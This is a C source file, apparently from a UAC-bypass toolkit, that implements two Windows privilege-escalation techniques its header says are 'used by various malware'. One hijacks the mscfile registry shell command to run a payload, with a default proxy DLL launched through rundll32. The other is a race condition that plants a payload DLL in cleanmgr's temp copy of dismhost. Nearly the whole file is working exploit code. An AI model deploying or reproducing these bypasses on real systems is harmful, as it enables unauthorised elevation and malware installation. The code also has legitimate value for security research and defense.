/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2017
*
*  TITLE:       ENIGMA0X3.C
*
*  VERSION:     2.54
*
*  DATE:        07 Feb 2017
*
*  Enigma0x3 autoelevation methods.
*  Used by various malware.
*
*  For description please visit original URL
*  https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
*  https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmHijackShellCommandMethod
*
* Purpose:
*
* Overwrite Default value of mscfile shell command with your payload.
*
*/
BOOL ucmHijackShellCommandMethod(
    _In_opt_ LPWSTR lpszPayload,
    _In_ LPWSTR lpszTargetApp
    )
{
    BOOL    bCond = FALSE, bResult = FALSE;
    HKEY    hKey = NULL;
    LRESULT lResult;
    LPWSTR  lpBuffer = NULL;
    SIZE_T  sz;
    WCHAR   szBuffer[MAX_PATH * 2];

    if (lpszTargetApp == NULL)
        return FALSE;
    
    do {

        sz = 0;
        if (lpszPayload == NULL) {
            sz = 0x1000;
        }
        else {
            sz = _strlen(lpszPayload);
        }
        lpBuffer = RtlAllocateHeap(g_ctx.Peb->ProcessHeap, HEAP_ZERO_MEMORY, sz);
        if (lpBuffer == NULL)
            break;

        if (lpszPayload != NULL) {
            _strcpy(lpBuffer, lpszPayload);
        }
        else {
            //no payload specified, use default fubuki, drop dll first as wdscore.dll to %temp%
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            _strcpy(szBuffer, g_ctx.szTempDirectory);
            _strcat(szBuffer, WDSCORE_DLL);
            //write proxy dll to disk
            if (!supWriteBufferToFile(szBuffer, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
                break;
            }

            //now rundll it
            _strcpy(lpBuffer, L"rundll32.exe ");
            _strcat(lpBuffer, szBuffer);
            _strcat(lpBuffer, L",WdsInitialize");
        }

        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, 
            L"Software\\Classes\\mscfile\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);

        if (lResult != ERROR_SUCCESS)
            break;

        lResult = RegSetValueEx(hKey, L"", 0, REG_SZ, (BYTE*)lpBuffer,
            (DWORD)(_strlen(lpBuffer) * sizeof(WCHAR)));

        if (lResult != ERROR_SUCCESS)
            break;

        bResult = supRunProcess(lpszTargetApp, NULL);

    } while (bCond);

    if (lpBuffer != NULL)
        RtlFreeHeap(g_ctx.Peb->ProcessHeap, 0, lpBuffer);

    if (hKey != NULL)
        RegCloseKey(hKey);

    return bResult;
}

/*
* ucmDiskCleanupWorkerThread
*
* Purpose:
*
* Worker thread.
*
*/
DWORD ucmDiskCleanupWorkerThread(
    LPVOID Parameter
)
{
    BOOL                        bCond = FALSE;
    NTSTATUS                    status;
    HANDLE                      hDirectory = NULL, hEvent = NULL;
    SIZE_T                      sz;
    PVOID                       Buffer = NULL;
    LPWSTR                      fp = NULL;
    UACMECONTEXT               *Context = (UACMECONTEXT *)Parameter;
    FILE_NOTIFY_INFORMATION    *pInfo = NULL;
    UNICODE_STRING              usName;
    IO_STATUS_BLOCK             IoStatusBlock;
    OBJECT_ATTRIBUTES           ObjectAttributes;
    WCHAR                       szFileName[MAX_PATH * 2], szTempBuffer[MAX_PATH];

    do {

        RtlSecureZeroMemory(&usName, sizeof(usName));
        if (!RtlDosPathNameToNtPathName_U(Context->szTempDirectory, &usName, NULL, NULL))
            break;

        InitializeObjectAttributes(&ObjectAttributes, &usName, OBJ_CASE_INSENSITIVE, 0, NULL);

        status = NtCreateFile(&hDirectory, FILE_LIST_DIRECTORY | SYNCHRONIZE,
            &ObjectAttributes,
            &IoStatusBlock,
            NULL,
            FILE_OPEN_FOR_BACKUP_INTENT,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );

        if (!NT_SUCCESS(status))
            break;

        sz = 1024 * 1024;
        Buffer = RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sz);
        if (Buffer == NULL)
            break;

        InitializeObjectAttributes(&ObjectAttributes, NULL, 0, 0, NULL);
        status = NtCreateEvent(&hEvent, EVENT_ALL_ACCESS, &ObjectAttributes, NotificationEvent, FALSE);
        if (!NT_SUCCESS(status))
            break;

        do {

            status = NtNotifyChangeDirectoryFile(hDirectory, hEvent, NULL, NULL,
                &IoStatusBlock, Buffer, (ULONG)sz, FILE_NOTIFY_CHANGE_FILE_NAME, TRUE);

            if (status == STATUS_PENDING)
                NtWaitForSingleObject(hEvent, TRUE, NULL);          

            NtSetEvent(hEvent, NULL);

            pInfo = (FILE_NOTIFY_INFORMATION*)Buffer;
            for (;;) {

                if (pInfo->Action == FILE_ACTION_ADDED) {

                    RtlSecureZeroMemory(szTempBuffer, sizeof(szTempBuffer));
                    _strncpy(szTempBuffer, MAX_PATH, pInfo->FileName, pInfo->FileNameLength / sizeof(WCHAR));
                    
                    if ((szTempBuffer[8] == L'-') &&      //
                        (szTempBuffer[13] == L'-') &&     // If GUID form directory name.
                        (szTempBuffer[18] == L'-') &&     //
                        (szTempBuffer[23] == L'-'))
                    {
                        //If it is file after LogProvider.dll
                        fp = _filename(szTempBuffer);
                        if (_strcmpi(fp, PROVPROVIDER_DLL) == 0) {
                            RtlSecureZeroMemory(szFileName, sizeof(szFileName));
                            _strcpy(szFileName, Context->szTempDirectory);
                            fp = _filepath(szTempBuffer, szTempBuffer);
                            if (fp) {
                                _strcat(szFileName, fp); //slash on the end
                                _strcat(szFileName, LOGPROVIDER_DLL);
                                supWriteBufferToFile(szFileName, Context->PayloadDll, Context->PayloadDllSize);                                
                            }
                            status = STATUS_NO_SECRETS;
                        } //_strcmpi
                    } //guid test
                } //Action

                if (status == STATUS_NO_SECRETS)
                    break;

                pInfo = (FILE_NOTIFY_INFORMATION*)(((LPBYTE)pInfo) + pInfo->NextEntryOffset);
                if (pInfo->NextEntryOffset == 0)
                    break;
            }

        } while (NT_SUCCESS(status));

    } while (bCond);

    if (usName.Buffer) {
        RtlFreeUnicodeString(&usName);
    }

    if (hDirectory != NULL)
        NtClose(hDirectory);

    if (hEvent)
        NtClose(hEvent);

    if (Buffer != NULL)
        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, Buffer);

    return 0;
}

/*
* ucmDiskCleanupRaceCondition
*
* Purpose:
*
* Use cleanmgr innovation implemented in Windows 10+.
* Cleanmgr.exe uses full copy of dismhost.exe from local %temp% directory.
* RC friendly.
*
*/
BOOL ucmDiskCleanupRaceCondition(
    VOID
)
{
    BOOL                bResult = FALSE;
    DWORD               ti;
    HANDLE              hThread = NULL;
    SHELLEXECUTEINFOW   shinfo;

    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ucmDiskCleanupWorkerThread, &g_ctx, 0, &ti);
    if (hThread) {
        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
        shinfo.cbSize = sizeof(shinfo);
        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shinfo.lpFile = SCHTASKS_EXE;
        shinfo.lpParameters = T_SCHTASKS_CMD;
        shinfo.nShow = SW_SHOW;
        if (ShellExecuteExW(&shinfo)) {
            if (shinfo.hProcess)
                WaitForSingleObject(shinfo.hProcess, INFINITE);
                CloseHandle(shinfo.hProcess);
        }
        //
        // Because cleanmgr.exe is slow we need to wait enough time until it will try to launch dismhost.exe
        // It may happen very fast or really slow depending on resources usage.
        // Well lets hope 10 min is enough.
        //
        if (WaitForSingleObject(hThread, 60000 * 10) == WAIT_OBJECT_0)
            bResult = TRUE;
        CloseHandle(hThread);
    }
    return bResult;
}
